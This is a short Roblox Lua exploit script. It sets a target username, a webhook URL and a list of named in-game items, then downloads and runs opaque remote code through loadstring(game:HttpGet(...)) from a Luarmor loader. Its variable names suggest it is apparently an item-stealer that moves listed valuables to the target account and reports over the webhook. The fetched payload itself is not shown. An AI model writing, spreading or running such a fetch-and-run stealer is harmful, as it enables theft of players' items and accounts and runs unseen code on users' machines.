getgenv().TARGET_USERNAME = "yourusername"
getgenv().WEBHOOK_URL = "webhookurl"
getgenv().NORMAL_BRAINROTS = {
    ["Garama and Madundung"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Aquanini"] = true,
    ["Dragon Gingerini"] = true
}
getgenv().NORMAL_BASE_SKINS = {
}
getgenv().NORMAL_GEARS = {
}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)
